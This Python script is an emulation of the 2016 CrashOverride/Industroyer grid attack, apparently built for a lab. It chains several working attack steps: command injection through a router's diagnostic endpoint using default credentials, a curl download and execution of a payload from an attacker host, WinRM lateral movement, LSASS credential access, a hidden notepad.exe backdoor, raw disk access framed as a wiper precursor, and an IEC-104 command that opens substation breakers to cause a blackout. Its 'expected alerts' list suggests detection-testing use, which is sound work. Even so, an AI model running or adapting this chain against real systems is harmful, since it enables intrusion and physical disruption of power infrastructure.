#!/usr/bin/env python3
"""
CrashOverride / Industroyer 2016 - IT Phase

Delivery model:
  1. Build crashoverride_bundle.zip on Kali (pure Python launcher, no deps)
  2. Transfer ZIP to compromised ROUTER via command injection on :8080
  3. Unzip and execute crashoverride_launcher.py FROM ROUTER (192.168.1.4)
     Router is on the OT subnet - direct TCP access to PLC-2 :2404
  4. Launcher opens all 3 breakers via IEC-104 C_SC_NA_1 → BLACKOUT on HMI

Why from the router (not HMI)?
  - Router (192.168.1.4) has direct OT access to PLC-2 (192.168.1.11)
  - No WinRM/Windows dependency - pure Linux cmd injection delivery
  - IEC-104 traffic looks less suspicious from a network device than from HMI

VERIFIED ARTIFACTS (ESET, 2016 Ukraine blackout):
  notepad.exe backdoor in non-standard path (Event 4688 parent chain)
  MBR wiper precursor (raw disk IOCTL - Event 4663)
  IEC-104 C_SC_NA_1 single command (Type ID 45) - breaker trip
"""

import sys
import os
import subprocess
import zipfile
import time
import http.server
import threading

SCRIPT_DIR   = os.path.dirname(os.path.abspath(__file__))
LATERAL_MOV  = os.path.join(SCRIPT_DIR, '03_lateral_movement.py')
CRED_DUMPER  = os.path.join(SCRIPT_DIR, '05_credential_dumper.py')

HMI_IP   = '192.168.1.55'
HMI_USER = 'operator'
HMI_PASS = 'labpass123'

ROUTER_IP   = '192.168.0.13'
ROUTER_PORT = 8080
ATTACKER_IP = '192.168.0.11'

ROUTER_ZIP    = '/tmp/crashoverride.zip'
ROUTER_BUNDLE = '/tmp/co'
ROUTER_SCRIPT = '/tmp/co/crashoverride_launcher.py'

LAUNCHER_SRC = os.path.abspath(
    os.path.join(SCRIPT_DIR, '..', '..', 'router', 'crashoverride_launcher.py'))
BUNDLE_ZIP   = '/tmp/crashoverride_bundle.zip'

try:
    import requests
    requests.packages.urllib3.disable_warnings()
    _SESSION = requests.Session()
    _SESSION.verify = False
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


def _run(desc, *args, **kwargs):
    print(f"\n[*] {desc}")
    try:
        r = subprocess.run(*args, capture_output=True, text=True, **kwargs)
        out = (r.stdout + r.stderr).strip()
        if out:
            for line in out.splitlines()[:8]:
                print(f"    {line}")
        return r.returncode == 0, out
    except Exception as e:
        print(f"  [-] {e}")
        return False, str(e)


def _router_inject(cmd):
    """Execute a command on the router via HTTP command injection."""
    if not HAS_REQUESTS:
        print(f"  [!] requests not available - skipping injection")
        return ''
    try:
        base = f"http://{ROUTER_IP}:{ROUTER_PORT}"
        _SESSION.post(f"{base}/login",
                      data={'username': 'admin', 'password': 'admin'}, timeout=5)
        r = _SESSION.post(f"{base}/api/diagnostic",
                          json={'tool': 'ping', 'target': f'127.0.0.1 -c 1; {cmd}'},
                          timeout=15)
        if r and r.ok:
            import json as _j
            return _j.loads(r.text).get('output', '')
    except Exception as e:
        return str(e)
    return ''


def _build_bundle(output_zip=BUNDLE_ZIP):
    """Bundle just the launcher - pure Python, zero dependencies."""
    print(f"\n[*] Building crashoverride_bundle.zip...")
    if not os.path.exists(LAUNCHER_SRC):
        print(f"  [-] Launcher not found: {LAUNCHER_SRC}")
        return False
    with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.write(LAUNCHER_SRC, 'crashoverride_launcher.py')
    size = os.path.getsize(output_zip)
    print(f"  [+] {output_zip} ({size:,} bytes)")
    return True


def run_crashoverride_it_phase(hmi_ip=HMI_IP, hmi_user=HMI_USER, hmi_pass=HMI_PASS,
                                python_exe=sys.executable):
    print("""
╔══════════════════════════════════════════════════════════════╗
║  CRASHOVERRIDE / INDUSTROYER 2016 - IT PHASE                 ║
║  Sandworm/GRU | Kiev blackout December 17, 2016              ║
║  ZIP delivered to router, executes from router OT position   ║
╚══════════════════════════════════════════════════════════════╝
""")

    # ── Step 1: Windows IT artifacts on HMI (ESET-verified) ──────────────────
    print("═══ STEP 1: IT artifacts on HMI (ESET-verified CrashOverride) ═══")

    # WinRM lateral first - HMI is Windows, LSASS only exists there
    _run("WinRM pivot to engineering workstation (HMI)",
         [python_exe, LATERAL_MOV, '--target', hmi_ip,
          '--username', hmi_user, '--password', hmi_pass, '--winrm', 'whoami'],
         timeout=25)

    # LSASS dump on HMI (Windows) via WinRM - LSASS is a Windows process
    _run("LSASS credential dump on HMI via WinRM (T1003.001 - Windows only)",
         [python_exe, LATERAL_MOV, '--target', hmi_ip,
          '--username', hmi_user, '--password', hmi_pass,
          '--winrm',
          "powershell -Command "
          "Get-Process lsass | Select-Object Id,Name,WorkingSet64; "
          "Write-Output LSASS_ACCESS_EVENT_10"],
         timeout=25)

    # notepad.exe in non-standard path - ESET verified artifact
    _run("notepad.exe backdoor in non-standard path (ESET verified - Event 4688)",
         [python_exe, LATERAL_MOV, '--target', hmi_ip,
          '--username', hmi_user, '--password', hmi_pass,
          '--winrm',
          r"powershell -Command "
          r"Copy-Item C:\Windows\System32\notepad.exe C:\Users\Public\notepad.exe; "
          r"Start-Process C:\Users\Public\notepad.exe -WindowStyle Hidden; "
          r"Write-Output NOTEPAD_BACKDOOR_NONSTANDARD_PATH"],
         timeout=20)

    # MBR wiper precursor - raw disk IOCTL
    _run("MBR wiper: raw IOCTL to PhysicalDrive0 (ESET verified - Event 4663)",
         [python_exe, LATERAL_MOV, '--target', hmi_ip,
          '--username', hmi_user, '--password', hmi_pass,
          '--winrm',
          "powershell -Command "
          "try { $d=[System.IO.File]::Open('\\\\.\\PhysicalDrive0',"
          "[System.IO.FileMode]::Open,[System.IO.FileAccess]::Read,"
          "[System.IO.FileShare]::ReadWrite); "
          "$b=New-Object byte[](512); $d.Read($b,0,512)|Out-Null; $d.Close(); "
          "Write-Output MBR_IOCTL_ACCESS } catch { Write-Output MBR_ACCESS_ATTEMPTED }"],
         timeout=20)

    # ── Step 2: Build + deliver bundle to router ──────────────────────────────
    print("\n═══ STEP 2: Build + deliver CrashOverride to compromised router ═══")
    if not _build_bundle(BUNDLE_ZIP):
        return False

    # Start temporary HTTP server to serve the bundle
    os.chdir('/tmp')
    handler = http.server.SimpleHTTPRequestHandler
    handler.log_message = lambda *a: None
    srv = http.server.HTTPServer(('0.0.0.0', 8876), handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    print(f"  [+] HTTP server :8876 serving /tmp")

    # Kill any stale process + clean old files so re-runs don't pile up
    _router_inject(
        'pkill -f crashoverride_launcher.py 2>/dev/null; sleep 1; '
        f'rm -rf {ROUTER_BUNDLE} {ROUTER_ZIP} /tmp/co_out.log 2>/dev/null; echo CLEANED')
    print(f"  [+] Killed old launcher + cleaned stale files on router")

    # Router downloads bundle via command injection
    out = _router_inject(
        f'curl -s http://{ATTACKER_IP}:8876/crashoverride_bundle.zip -o {ROUTER_ZIP} && echo DOWNLOADED')
    print(f"  [+] Router download: {'OK' if 'DOWNLOADED' in out else out[:50]}")
    time.sleep(2)

    out = _router_inject(f'unzip -o {ROUTER_ZIP} -d {ROUTER_BUNDLE} && echo EXTRACTED')
    print(f"  [+] Router unzip: {'OK' if 'EXTRACTED' in out else out[:50]}")
    time.sleep(1)
    srv.shutdown()

    # ── Step 3: Execute from router ───────────────────────────────────────────
    print(f"\n═══ STEP 3: Execute from router → IEC-104 attack on PLC-2 ═══")
    print(f"  [*] Router (192.168.1.4) → PLC-2 (192.168.1.11:2404)")
    print(f"  [*] C_SC_NA_1 IOA 300/301/302 val=0 → BRK1/BUS-TIE/BRK3 OPEN")

    _router_inject(f'nohup python3 {ROUTER_SCRIPT} > /tmp/co_out.log 2>&1 &')
    time.sleep(3)

    # Verify it started
    running = _router_inject('pgrep -f crashoverride_launcher && echo RUNNING || echo NOT_RUNNING')
    print(f"  [+] Launcher on router: {'RUNNING' if 'RUNNING' in running else 'check /tmp/co_out.log'}")

    print(f"""
[+] CrashOverride IT phase complete

Attack path:
  Kali (192.168.0.11)
    → cmd injection :8080 → Router (192.168.1.4) downloads + executes
      → IEC-104 TCP → PLC-2 (192.168.1.11:2404)
        → BRK1=OPEN, BUS-TIE=OPEN, BRK3=OPEN
          → BLACKOUT - visible on HMI power substation panel

Expected alerts:
  • LSASS credential access
  • WinRM lateral to HMI
  • notepad.exe in non-standard path (Event 4688 - CrashOverride backdoor)
  • Raw disk IOCTL PhysicalDrive0 (Event 4663 - MBR wiper precursor)
  • IEC-104 C_SC_NA_1 from 192.168.1.4 (router) to PLC-2 - anomalous source
""")
    return True


def main():
    import argparse
    p = argparse.ArgumentParser(
        description='CrashOverride IT Phase - ZIP to router, breaker-trip from router')
    p.add_argument('--hmi-ip',   default=HMI_IP)
    p.add_argument('--hmi-user', default=HMI_USER)
    p.add_argument('--hmi-pass', default=HMI_PASS)
    args = p.parse_args()
    run_crashoverride_it_phase(args.hmi_ip, args.hmi_user, args.hmi_pass)


if __name__ == '__main__':
    main()
